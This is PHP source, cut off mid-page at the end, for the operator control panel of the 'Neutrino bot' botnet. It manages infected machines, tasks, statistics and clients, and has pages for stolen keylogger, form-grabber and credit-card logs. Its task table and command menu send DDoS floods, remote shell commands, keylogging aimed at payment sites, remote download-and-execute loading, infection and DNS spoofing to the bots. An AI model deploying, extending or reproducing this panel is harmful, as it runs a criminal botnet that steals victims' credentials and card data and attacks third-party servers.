<?php
header('Content-Type: text/html; charset=utf8');
header("Cache-control: public");
header("Expires: " . gmdate("D, d M Y H:i:s", time() + 60*60) . " GMT");

session_start();
define('N3N', 1);

include("config.php");
include("functions.php");

if (!CheckGuest($key_tologin)) {
    NotFound();
}
ConnectMySQL($db_host, $db_login, $db_password, $db_database);
include("inc/auth.php");

if (USER_LOGGED) {
    if (!check_user($UserID)) {
        unset($_SESSION['uid']);
        echo '<script type="text/javascript">location.reload();</script>';
    }
} else {
    ?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <head xmlns="http://www.w3.org/1999/html">
        <title></title>
        <link href="css/bootstrap.css" rel="stylesheet" media="screen">
    </head>
    <body>

    <div class="panel panel-primary" style="width: 20%;margin: 0 auto; text-align: center">
        <div class="panel-heading"><b>Authorization</b></div>
        <div class="panel-body">
            <form method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                <div class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                    <input type="text" id="user" class="form-control" name="user" placeholder="Username"
                           autocomplete="off">
                </div>
                <p></p>

                <div class="input-group">
                    <span class="input-group-addon"> <i class="glyphicon glyphicon glyphicon-lock"></i></span>
                    <input type="password" id="pass" class="form-control" name="pass" placeholder="Password">
                </div>
                <br>

                <button type="submit" name="login" class="btn btn-info" style="width: 90%">Sign in</button>
            </form>
        </div>
    </div>
    </body>
    <?php
    die();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
    <title>-Neutrino-</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8"/>
    <link href="css/bootstrap.css" rel="stylesheet" media="screen">
    <link href="css/datepicker.css" rel="stylesheet">
    <script src="js/allinone.js"></script>
    <style>
        .class-with-width {
            width: auto !important;
        }
    </style>

    <script type="text/javascript">
        function ConfirmDelete(link) {
            bootbox.confirm("Are you sure?", function (result) {
                if (!result)
                    return true;
                else
                    location.href = link;
            });
        }
        function ConfirmText(text, link) {
            bootbox.confirm(text, function (result) {
                location.href = link;
            });
        }
        $(document).ready(function () {
            $("#filter").hide();
            $("#hide").click(function () {
                $("#filter").hide();
            });
            $("#show").click(function () {
                $("#filter").show();
            });
        });
    </script>
</head>
<body>

<script>
    if (top.location != location) {
        top.location.href = document.location.href;
    }
    $(function () {
        $('#dp1').datepicker({
            format: 'yyyy-mm-dd'
        });
        $('#dp2').datepicker({
            format: 'yyyy-mm-dd'
        });
        $('#dpYears').datepicker();
        $('#dpMonths').datepicker();

        var nowTemp = new Date();
        var now = new Date(nowTemp.getFullYear(), nowTemp.getMonth(), nowTemp.getDate(), 0, 0, 0, 0);

        var checkin = $('#dpd1').datepicker({
            onRender: function (date) {
                return date.valueOf();
            }
        }).on('changeDate', function (ev) {
            if (ev.date.valueOf() > checkout.date.valueOf()) {
                var newDate = new Date(ev.date)
                newDate.setDate(newDate.getDate() + 1);
                checkout.setValue(newDate);
            }
            checkin.hide();
            $('#dpd2')[0].focus();
        }).data('datepicker');
        var checkout = $('#dpd2').datepicker({
            onRender: function (date) {
                return date.valueOf();
            }
        }).on('changeDate', function (ev) {
            checkout.hide();
        }).data('datepicker');
    });
</script>
<div class="navbar navbar-inverse">
    <div class="navbar-header">
        <a class="navbar-brand" href="" title="Refresh current page">{ Neutrino bot }</a>
    </div>
    <div class="navbar-collapse collapse navbar-responsive-collapse" style="text-align: center;">
        <ul class="nav navbar-nav" style="display: table-row; vertical-align: middle;">
            <li><a href="?act=tasks" title="Task"><span
                        style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-list"></span> Task manager</span></a></li>
            <li><a href="?act=stats" title="Statistics"><span style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-stats"></span> Statistics</span></a>
            </li>
            <li><a href="?act=clients" title="Clients"><span
                        style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-user"></span> Clients</span></a></li>
            <li><a href="?act=files" title="Files"><span
                        style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-file"></span> Filelist</span></a></li>
            <li><a href="?act=ff" title="Formgrabber"><span style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-globe"></span> Formgrabber</span></a>
            </li>
            <li><a href="?act=logs" title="Logs"><span style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-th"></span>Keylogger logs</span></a>
            </li>
            <li><a href="?act=dumps" title="Logs"><span style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-credit-card"></span> CC Logs</span></a>
            </li>
            <li><a href="?act=settings" title="Settings"><span style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-cog"></span> Settings</span></a>
            </li>
        </ul>
        <ul class="nav navbar-nav navbar-right">
            <li><a href="?act=upload" title="Upload"><span
                        style="vertical-align: middle;"><span
                            class="glyphicon glyphicon-upload"></span> Upload</span></a></li>
            <li><a href="?act=logout" title="Logout"><span
                        style="vertical-align: middle;"><span class="glyphicon glyphicon-log-out"></span> Logout</span></a>
            </li>
        </ul>
    </div>
</div>
<?php

$country_codes = $GLOBALS['ccode'];
$country_names = $GLOBALS['cname'];
$act = $_GET['act'];
$do = $_GET['do'];

ConnectMySQL($db_host, $db_login, $db_password, $db_database);

$task = htmlspecialchars($_GET['task']);
$task_id = addslashes($_GET['task_id']);

if ($task) {
    if ($task == "start")
        $sql = "update botnet_tasks set status='1' where task_id = '$task_id'";
    if ($task == "stop")
        $sql = "update botnet_tasks set status='0' where task_id = '$task_id'";
    if ($task == "kill")
        $sql = "delete from botnet_tasks where task_id = '$task_id'";

    if ($task == "start_all_tasks")
        $sql = "UPDATE botnet_tasks SET status='1'";
    if ($task == "stop_all_tasks")
        $sql = "UPDATE botnet_tasks SET status='0'";
    if ($task == "kill_all_tasks")
        $sql = "truncate botnet_tasks";

    if (mysql_query($sql))
        MessageRedirect($tasks_url);
    else
        MessageRedirect($tasks_url, "Unable to execute command!");
}
if ($act == "tasks" || is_null($act)) {

    $res = mysql_query("SELECT * FROM botnet_tasks");
    if ($res) {
        $rows = mysql_num_rows($res);
        if ($rows != 0) {
            echo '<table class="table table-striped table-hover" align=center >' .
                '<tr style="vertical-align: middle;"><th>#</th>' .
                '<th><b> User </th>' .
                '<th><b> Task ID:Number </th>' .

                '<th><b> Creation date </th>' .
                '<th><b> Command </th>' .

                '<td style="text-align: center"><b> Status </td>' .
                '<td style="text-align: center"><b> Executed \ Need \ Failed </td>' .
                '<td style="text-align: center"><b> Country </td>' .
                '<td style="text-align: center">' .

                '<a><li class="pull-right dropdown" style ="list-style-type: none;">' .
                '<a style="text-decoration: none;" class="dropdown-toggle" data-toggle="dropdown" href="#"> Action <span class="caret"></span></a>' .
                '<ul class="dropdown-menu" style="text-align:left">' .
                '<li><a href="?act=tasks&task=start_all_tasks"><span class="glyphicon glyphicon-play"></span> Run all tasks</a></li>' .
                '<li><a href="?act=tasks&task=stop_all_tasks"><span class="glyphicon glyphicon-stop"></span> Stop all tasks</a></li>' .
                '<li class="divider"></li>' .
                '<li><a href="#" onclick=ConfirmDelete("?act=tasks&task=kill_all_tasks");><span class="glyphicon glyphicon-remove"></span> Delete all tasks</a></li>' .
                '</ul>' .
                '</li>' .
                '</a>' .
                '</td>';

            for ($i = 0; $i < $rows; $i++) {
                $row = mysql_fetch_assoc($res);

                echo '<tr class="active">' .
                    '<td>' . $i . '</td>' .
                    '<td> <i>' . $row["by_user"] . '</i></td>' .
                    '<td>' . $row["task_id"] . ":" . $row["id"] . '</td>' .
                    '<td> <i>' . $row["task_date"] . '</i></td>' .
                    '<td>' . CmdParser($row["tasks_pref"]) . urldecode($row["command"]) . CmdParser($row["tasks_postf"]) . '</td>';


                if ($row['status'] == 1)
                    echo '<td style="text-align: center;vertical-align:middle;"><span class="label label-success"><b> START </b></span></td>';
                else
                    echo '<td style="text-align: center;vertical-align:middle;"><span class="label label-warning"><b> STOP </b></span></td>';

                echo '<td style="text-align: center">' . $row["execs"] . " \\ " . $row["needexecs"] . " \\ " . $row["failed"] . '</td>' .
                    '<td style="text-align: center;vertical-align:middle;">' . ShowFlag($row["bots"], $options[$row['bots']]) . '</td>' .
                    '<td style="text-align: right;">' .
                    '<a href = "?act=tasks&task_id=' . $row["task_id"] . '&task=start" title=Start><span class="glyphicon glyphicon-play"></span></span></a>' .
                    '<a href = "?act=tasks&task_id=' . $row["task_id"] . '&task=stop" title=Stop><span class="glyphicon glyphicon-stop"></span></a>' .
                    '<a href = "#"  onclick=ConfirmDelete("?act=tasks&task_id=' . $row["task_id"] . '&task=kill"); title=Delete><span class="glyphicon glyphicon-remove"></span></a>' .
                    '</td>' .
                    '</tr>';
            }

            echo '</td>' .
                '</tr>' .
                '<tr><tbody></table>';
        }
    }
    ?>
    <div class="btn-group btn-group-justified" style="width: 15%;margin: 0 auto;">
        <a id="show" class="btn btn-default" title="Show command examples">Show</a>
        <a id="hide" class="btn btn-default" title="Hide command examples">Hide</a>
    </div>

    <div class="panel panel-info" id="filter" style="width: 60%;margin: 0 auto;">
        <div class="panel-heading"><b>Task examples</b></div>
        <div class="panel-body">
            <div class="container">
                <table class="table-condensed table-hover">
                    <tr class="active">
                        <td><b>Command</b></td>
                        <td><b>Options</b></td>
                        <td><b>Example</b></td>
                        <td><b>Description</b></td>
                    </tr>
                    <tr class="active">
                        <td><b>Http DDOS</b></td>
                        <td>host threads</td>
                        <td>http://example.com/ 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>HttpS DDOS</b></td>
                        <td>host threads</td>
                        <td>https://example.com/ 50</td>
                        <td>HTTPS DDOS</td>
                    </tr>
                    <tr class="active">
                        <td><b>Smart DDOS</b></td>
                        <td>host threads</td>
                        <td>http://example.com/ 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Slowloris DDOS</b></td>
                        <td>host threads</td>
                        <td>http://example.com/ 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Download Flood</b></td>
                        <td>host threads</td>
                        <td>http://example.com/file.ext 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>UDP DDOS</b></td>
                        <td>ip port threads</td>
                        <td>127.0.0.1 25 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>TCP DDOS</b></td>
                        <td>ip port threads</td>
                        <td>127.0.0.1 25 50</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Find file</b></td>
                        <td> filename.ext count(max. 200)</td>
                        <td>notepad.exe 3</td>
                        <td>You can specify a partial name, ex: "notepa"</td>
                    </tr>
                    <tr class="active">
                        <td><b>CMD shell</b></td>
                        <td>command param</td>
                        <td>notepad readme.txt</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Keylogger</b></td>
                        <td>screenshot_on_off relative_text_in_the_window_name</td>
                        <td>1 paypal|perfect</td>
                        <td>1 - on, 0 - off</td>
                    </tr>
                    <tr class="active">
                        <td><b>Update</b></td>
                        <td>http://example.ru/file.exe</td>
                        <td>---------</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Loader</b></td>
                        <td>http://example.ru/file.ext param</td>
                        <td>http://example.ru/bot.exe debug</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>Bot killer</b></td>
                        <td>no param</td>
                        <td>---------</td>
                        <td>---------</td>
                    </tr>

                    <tr class="active">
                        <td><b>Infection</b></td>
                        <td>no param</td>
                        <td>---------</td>
                        <td>---------</td>
                    </tr>
                    <tr class="active">
                        <td><b>DNS Spoofing</b></td>
                        <td>original.com spoofed.com</td>
                        <td>---------</td>
                        <td>---------</td>
                    </tr>
                </table>
            </div>
        </div>
    </div>
    <br>

    <form action='index.php' method='post'>
        <div class="panel panel-default" style="width: 65%;margin: 0 auto;">
            <div class="panel-body">
                <div class="input-group" style="width: 30%;float: left;">
                    <span class="input-group-addon">Command type :</span>
                    <select name="type_attack" class="form-control">
                        <option>Http DDOS</option>
                        <option>HttpS DDOS</option>
                        <option>Smart http DDOS</option>
                        <option>Slowloris DDOS</option>
                        <option>Download Flood</option>
                        <option>UDP DDOS</option>
                        <option>TCP DDOS</option>
                        <option>Find file</option>
                        <option>CMD shell</option>
                        <option>Keylogger</option>
                        <option>Update</option>
                        <option>Loader</option>
                        <option>Bot killer</option>
                        <option>Infection</option>
                        <option>DNS Spoofing</option>

                    </select>
                </div>
                <input type="text" style="width: 69%;margin-left:3px;" class="form-control"
                       placeholder="Enter the command parameters..."
                       size="150"
                       name="urls" id="urls">

                <br>

                <div style="float: left;">
                    <input type="hidden" name="by_id" checked="checked" value="uid">

                    <div class="input-group" style="width: 40%;float: left;">
                        <span class="input-group-addon">By country :</span>
                        <select name="country" class="form-control">
                            <option class="icon" value="ALL"> All countries</option>
                            <?php
                            for ($i = 1; $i < 247; $i++) {
                                echo '<option value=' . $country_codes[$i] . ' >(' . $country_codes[$i] . ') ' . $country_names[$i] . ' </option>';
                            }
                            ?>
                        </select>
                    </div>

                    <div class="input-group" style="width: 40%;float: left; margin-left:3px;">
                        <span class="input-group-addon">By machine id :</span>
                        <?php echo '<input type="text" class="form-control" name="bot_uid" size="50" value="';
                        if (isset($_GET['botuid'])) {
                            echo htmlspecialchars($_GET['botuid']);
                        }
                        echo "\">"; ?>
                    </div>

                    <div class="input-group" style="width: 19%;float: left; margin-left:3px;">
                        <span class="input-group-addon">Limit :</span>
                        <input type="text" class="form-control" placeholder="0 - unlim" name='execs'>
                    </div>
                </div>
            </div>
        </div>
        <br>

        <div style="text-align: center;">
            <input class="btn btn-default" type="submit" name="create_task" title="Create task" value="Create task">
        </div>
    </form>


<?php
if (isset($_GET['botuid'])) {
?>
    <script type="text/javascript">document.getElementById("botid").checked = true;</script>
<?php
}
}

if ($act == "stats") {

    if (isset($_GET['bot']) == "kill") {
        $layer_url = htmlspecialchars(addslashes($_GET['layer_url']));
        if (mysql_query("DELETE FROM p_layer WHERE layer_url='" . $layer_url . "'"))
            MessageRedirect($stats_url);
    }
    if (isset($_POST['kill_all'])) {
        mysql_query("truncate table botnet_bots");
    }

    if (isset($_POST['kill_off'])) {
        $time = (time() - (60 * refresh_rate("get", null)));
        $sql = "DELETE FROM botnet_bots WHERE `bot_time`<" . $time;
        mysql_query($sql);
    }

    if (isset($_POST['kill_ban'])) {
        mysql_query("truncate table banned");

    }

    $time = (time() - (60 * refresh_rate("get", null)));
    $bots_total = intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_bots"), 0));

    if ($bots_total > 0) {

        $sql = "SELECT COUNT(*) FROM botnet_bots WHERE `bot_time`>" . $time;
        $bots_online = intval(mysql_result(mysql_query($sql), 0));

        $sql = "SELECT COUNT(*) FROM botnet_bots WHERE `bot_time`<" . $time;
        $bots_offline = intval(mysql_result(mysql_query($sql), 0));

        $sql = "SELECT COUNT(*) FROM botnet_bots WHERE " . time() . "-`bot_time`<" . (60 * 60);
        $bots_hour = intval(mysql_result(mysql_query($sql), 0));

        $sql = "SELECT COUNT(*) FROM botnet_bots WHERE " . time() . "- `bot_time`<" . (60 * 60 * 24);
        $bots_day = intval(mysql_result(mysql_query($sql), 0));

        $sql = "SELECT COUNT(*) FROM `banned`";
        $bots_banned = intval(mysql_result(mysql_query($sql), 0));

        GetSmallStat($bots_online, $bots_offline, $bots_hour, $bots_day, $bots_total, $bots_banned);

        ?>

        <div style="text-align: center;">
            <form method="POST" action="">
                <div class="btn-group">
                    <input class="btn btn-default" type="submit" name="kill_all" value="Clear stat">
                    <input class="btn btn-default" type="submit" name="kill_off" value="Clear offline">
                    <input class="btn btn-default" type="submit" name="kill_ban" value="Clear banned">
                </div>
            </form>
        </div>
        <br>


        <table class="table table-condensed table-hover" style="width:40%; margin-left:5%;float:left; ">
            <tr class="active">
                <th><b>[Total]</b> Country</th>
                <th>Online</th>
                <th>Offline</th>
            </tr>
            <tbody>

            <?php
            for ($i = 0; $i < 247; $i++) {

                $bots_online = intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_bots WHERE `bot_time`>" . $time . " AND bot_country = '" . $country_codes[$i] . "'"), 0));
                $bots_offline = intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_bots WHERE `bot_time`<" . $time . " AND bot_country = '" . $country_codes[$i] . "'"), 0));

                if ($bots_online != 0 || $bots_offline != 0) {
                    echo "<tr class=\"active\">";
                    echo "<td>" . ShowFlag($country_codes[$i], $country_names[$i]) . " $country_names[$i] <i> [$country_codes[$i]]</i></td>";
                    echo "<td><code>$bots_online</code></td>";
                    echo "<td><code>$bots_offline</code></td>";
                    echo "</tr>";
                }
            }
            ?>
            </tbody>
        </table>
        <?php
        $res = mysql_query("SELECT * FROM p_layer");
        if ($res) {
            $rows = mysql_num_rows($res);
            if ($rows != 0) {

                echo '<table class="table table-condensed table-hover" style="width:40%; margin-right:5%;float:right;">' .
                    '<tr class="active">' .
                    '<th> <b>[Layer]</b> List URL</th>' .
                    '<th style="text-align: center">Alive</th>' .
                    '<th style="text-align: center">Action</th>' .
                    '<tr><tbody>';

                for ($i = 0; $i < $rows; $i++) {
                    $row = mysql_fetch_assoc($res);
                    echo "<tr class=\"active\">";
                    echo "<td><b>" . $row['layer_url'] . "</b></td>";

                    if (intval($row['layer_cktime']) > $time) {
                        echo '<td style="text-align: center"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ3RjQwMjI0MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ3RjQwMjI1MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDdGNDAyMjIzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDdGNDAyMjMzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5Fk6I0AAAAP1BMVEX///8AMwAAPgAAdAAAjwAAkQAAlAAAlgAAmAAAmQAAmgAAmwAAngAAoQAAowAAqQAArAAArQAArgAA/wD///+npAnLAAAAAXRSTlMAQObYZgAAAM9JREFUOMutk9sOwyAMQ4EMmrb0tuX/v3V26Z6WrZPWcGRFkWPBAyGEdEEFVHpcUIk59+H+N0hK27BdAIKGdT3Dzj0IWpaerP36sTGxMw+DuuUMk16+e2YEdfPsYmYdhSq2d5g3fSeFOE3Fw2YRm0ya8qAr+9TzM6jU6mBSKteb8lR2LHH8MUQ/px6Lh+5dafcScfwIGsfsYTJmLjblyeOhnh9BmtUFb1Au6itI0XGaxfEj6KbqgzeoChuoQG9Q5dQxR3w2/Rj1O/v3jxdUCE92yC3ZVzx+VgAAAABJRU5ErkJggg==" title="Last access: ' . $row['layer_ckdate'] . '"></td>';
                    } else {
                        echo '<td style="text-align: center"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkNCRTQ0RDcwMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkNCRTQ0RDcxMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6Q0JFNDRENkUzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6Q0JFNDRENkYzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz41c02nAAAAWlBMVEX///9JAgJvBQV8AgV9Bwd/BAqBAAPVBxfYAhHmAhTmGCXnBhj/AR3/ASD/AiH/BSH/BSX/DCf/DST/Eir/GCb/Giz/ICj/IC3/KCv/KC//LjH/U1P/X1////9Eo2rSAAAAAXRSTlMAQObYZgAAAQNJREFUOMutU9uOgyAUPN6qiMULIGvX8/+/uXNQk6bS7oMlw2SYzJnAA0SUl+VlEFa+rr+XkUnP4+dxGWtJ5TIvX0BO1ccA8yKb/62qKA9hfgue25ZDWzP4QwyoqArOexc2QG/YHdbBsXae66DfZaLj8TRnvZjeRo4Qh5mtA/m4NYuGE49H5mmqoMLaKQGetGbLNVjrGkU66t0/51E0TqOgfwKOrMdexoX7ketDy73EeZ1CUT8MCSA8cLPxMKCgOZxG6+acR1GyZxtXG6NWHTpyIl/QzXQmBbzAYBxCdQY3OXT0z3ncKN1jjFLIy4jCUYF3Hf1TviDK7t39MjL5/rcvLKI/xWJOTGTVfyAAAAAASUVORK5CYII=" title="Last access: ' . $row['layer_ckdate'] . '"></td>';
                    }
                    echo "<td style=\"text-align: center\"><a href = \"?act=stats&bot=kill&layer_url=" . urlencode($row["layer_url"]) . "\" title=Delete><span class=\"glyphicon glyphicon-remove\"></span></a></td></tr>";
                }
                echo '</tbody></table>';
            }
        }

        echo '<table class="table table-condensed table-hover" style="width:40%; margin-right:5%;float:right;" >' .
            '<tr class="active">' .
            '<th><b>[Top 10 today]</b> Country</th> <th>Bots</th> <th>Percent</th>' .
            '<tbody>';

        $today = date('Y-m-d');
        $yesterday = date('Y-m-d', time() - 86400);

        $query1 = mysql_query("SELECT COUNT(*) AS count FROM botnet_bots WHERE bot_date LIKE '%$today%'");
        while ($row = mysql_fetch_array($query1)) {
            $alle = htmlspecialchars($row[count]);
        }

        $query2 = mysql_query("SELECT * FROM botnet_bots WHERE bot_date LIKE '%$today%' GROUP BY bot_country HAVING count(bot_country) >= 1 ORDER BY count(bot_country) DESC LIMIT 10");
        $array = array();

        while ($row = mysql_fetch_array($query2)) {
            $country = htmlspecialchars($row['bot_country']);
            $query3 = mysql_query("SELECT COUNT(*) AS count FROM botnet_bots WHERE bot_country = '$country' AND bot_date LIKE '%$today%'");
            while ($row = mysql_fetch_array($query3)) {
                $zahl = htmlspecialchars($row['count']);

                array_push($array, $zahl);
                $gesamt = $alle;
                $total = htmlspecialchars($zahl / $gesamt * 100);

                echo "<tr class=\"active\"><td>" . ShowFlag($country) . " " . $options[strtoupper($country)] . ' <i>[' . $country . '] </i>' . '</td><td><code> ' . htmlspecialchars($zahl) . '</code></td><td><code>' . htmlspecialchars(round($total, 1)) . '%</code></td></tr>';
            }
        }
        echo "</tbody></table>";

        echo '<table class="table table-condensed table-hover " style="width:40%; margin-right:5%;float:right;" >' .
            '<tr class="active"><th><b>[OS]</b> Statistics</th><th>Count</th><tbody>';


        $query = mysql_query("SELECT bot_os, COUNT(*) AS CNT FROM botnet_bots GROUP BY bot_os");
        while ($row = mysql_fetch_array($query)) {
            echo "<tr class=\"active\"><td>" . $row['bot_os'] . "</td><td><code>" . $row['CNT'] . "</code></td></tr>";
        }
        echo "</tbody></table>";

    } else {
        ?>
        <div class="panel panel-warning" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Warning</h3>
            </div>
            <div class="panel-body">
                No bots in database
            </div>
        </div>
    <?php
    }
}

if ($act == "clients") {
    if ($_GET['bot'] == "kill") {
        $bot_uid = htmlspecialchars(addslashes($_GET['botuid']));
        $sql = "DELETE FROM botnet_bots WHERE bot_uid='" . $bot_uid . "'";
        if (mysql_query($sql))
            MessageRedirect($bots_url);
    }
    if (intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_bots"), 0)) <= 0) {
        ?>
        <div class="panel panel-warning" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Warning</h3>
            </div>
            <div class="panel-body">
                No bots in database
            </div>
        </div>
        <?php
        exit;
    } else {
        $sql = "SELECT * FROM botnet_bots";
        if (($_GET['countries'])) {
            if (($_GET['countries']) !== "ALL") {
                $sql .= " WHERE bot_country = '" . addslashes($_GET['countries']) . "'";
            } else {
                if (($_GET['countries']) !== "ALL" && ($_GET['status']) !== "total") {
                    $sql .= " WHERE bot_country = '" . addslashes($_POST['countries']) . "'";
                }
            }
        }
        if (($_GET['status']) && ($_GET['status']) != "total") {
            if (strstr($sql, " WHERE ") == FALSE) {
                $sql .= " WHERE ";
            } else
                $sql .= " AND ";

            if (($_GET['status']) == "offline") {
                $sql .= time() . " - `bot_time` > " . (60 * refresh_rate("get", null));
            } else {
                if (($_GET['status']) == "online") {
                    $sql .= time() . " - `bot_time` < " . (60 * refresh_rate("get", null));
                }
            }
        }
        if (($_GET['os'])) {
            if (strstr($sql, " WHERE ") == FALSE) {
                $sql .= " WHERE ";
            } else
                $sql .= " AND ";
            $sql .= "bot_os = '" . addslashes($_GET['os']) . "'";
        }
        if (($_GET['bot_ip'])) {
            if (strstr($sql, " WHERE ") == FALSE) {
                $sql .= " WHERE ";
            } else
                $sql .= " AND ";
            $sql .= "bot_ip = '" . addslashes($_GET['bot_ip']) . "'";
        }
        if (($_GET['bot_uid'])) {
            if (strstr($sql, " WHERE ") == FALSE) {
                $sql .= " WHERE ";
            } else
                $sql .= " AND ";
            $sql .= "bot_uid = '" . addslashes(urlencode($_GET['bot_uid'])) . "'";
        }
        if (($_GET['bot_name'])) {
            if (strstr($sql, " WHERE ") == FALSE) {
                $sql .= " WHERE ";
            } else
                $sql .= " AND ";
            $sql .= "bot_name = '" . addslashes(urlencode($_GET['bot_name'])) . "'";
        }

        $sqlc = str_replace("*", "COUNT(*)", $sql); // count
        $bots_page_limit = 25;

        $page = intval($_GET['page']);
        if ($page) {
            $lim = intval($page * $bots_page_limit);
            $sql .= " LIMIT $lim, $bots_page_limit";
        } else
            $sql .= " LIMIT 0, $bots_page_limit";

        $count_pages = mysql_result(mysql_query($sqlc), 0);
        $count_pages = intval($count_pages / $bots_page_limit);
        $qstring = $_SERVER['QUERY_STRING'];
        $q_str = explode("&", $qstring);
        foreach ($q_str as $s_str) {
            if (strstr($s_str, "page"))
                break;
            else
                $str .= htmlspecialchars($s_str) . "&";
        }

        $res = mysql_query($sql);
        $rows = mysql_num_rows($res);

        $res = mysql_query($sql);
        if ($res)
            $rows = mysql_num_rows($res);

        if ($rows != 0) {
            ?>
            <div class="btn-group btn-group-justified" style="width: 15%;margin: 0 auto;">
                <a id="show" class="btn btn-default">Show</a>
                <a id="hide" class="btn btn-default">Hide</a>
            </div>
            <div class="panel panel-info" id="filter" style="width: 25%;margin: 0 auto;">

                <div class="panel-heading"><b>Filter</b></div>
